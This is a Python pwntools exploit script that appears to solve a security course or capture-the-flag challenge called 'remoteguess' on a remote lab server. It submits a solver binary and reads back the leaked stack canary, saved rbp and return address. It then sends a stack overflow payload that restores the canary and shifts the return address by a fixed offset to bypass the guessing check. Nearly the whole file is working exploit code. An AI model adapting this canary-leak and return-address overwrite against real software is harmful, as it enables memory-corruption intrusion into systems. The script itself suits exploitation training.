#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.terminal = ['tmux', 'splitw', '-h']

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)  #local
# r = process("./remoteguess")  #local
# r = process("qemu-x86_64-static -E NO_SANDBOX=1 ./remoteguess", shell=True)  #local
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)  # remote

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    # gdb.attach(r)
    r.sendafter(b'bytes): ', payload)

    # my code
    msg = r.recvline()
    msg = r.recvline()

    canary = r.recvline(keepends=False).decode()
    print("****** canary: " + str(canary))
    rbp = r.recvline(keepends=False).decode()
    print("****** rbp: " + str(rbp))
    returnAddrSolver = r.recvline(keepends=False).decode()
    print("****** return addrsolver: " + str(returnAddrSolver))
    # print("**** 1. return address in byte form: " + str(returnAddrByte))
    # returnAddrSolver = int.from_bytes(returnAddrByte, 'big')
    # print("***** return address of solver: " + str(returnAddrSolver))

    offsetToGuess = 0xab  # because: a2ff -> a3aa
    returnAddr = int(returnAddrSolver, 16) + offsetToGuess
    # print("****** return addr: " + str(returnAddr))
    # print("***** return address of guess: " + str(hex(returnAddr)))

    # gdb.attach(r)

    myguess = 0
    ans = str(myguess).encode('ascii').ljust(24, b'\0')  # guess: buf[16] + int val + int sz
    print("**** ans (myguess): " + str(ans))

    # p64 -> number to ascii
    ans += p64(int(canary, 16))
    ans += p64(int(rbp, 16))
    ans += p64(returnAddr)
    ans += (b'\0'* 8)  # ???8
    ans += p64(myguess) # magic
    
    print("**** ans: " + str(ans))
    r.sendafter(b'answer? ', ans)
    # end of my code

else:
    r.sendlineafter(b'send to me? ', b'0')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :